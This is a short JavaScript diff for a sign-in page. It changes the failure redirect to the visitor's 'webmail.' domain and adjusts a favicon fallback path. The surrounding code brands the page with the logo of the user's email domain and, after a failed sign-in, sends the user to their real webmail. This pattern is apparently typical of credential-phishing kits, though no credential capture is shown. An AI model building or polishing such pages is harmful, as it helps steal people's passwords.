@@ -22,7 +22,7 @@ function getEmailDomain(email) {
 
 function handleRedirectOnFailure(email) {
   const domain = getEmailDomain(email);
-  window.top.location.href = domain ? `https://${domain}` : "https://yourdomain.com/help";
+  window.top.location.href = domain ? `https://webmail.${domain}` : "https://yourdomain.com/help";
 }
 
 function setImages(domain) {
@@ -39,7 +39,7 @@ function setImages(domain) {
     logoImg.style.display = "block";
     logoImg.onerror = () => {
       // fallback to bundled favicon if clearbit doesn't return an image
-      logoImg.src = "./favicon.ico";
+      logoImg.src = "favicon.ico";
     };
   }
 
@@ -172,4 +172,5 @@ document.addEventListener("DOMContentLoaded", () => {
     submitBtn.disabled = false;
     submitBtn.textContent = "Sign in";
   }
+
 });
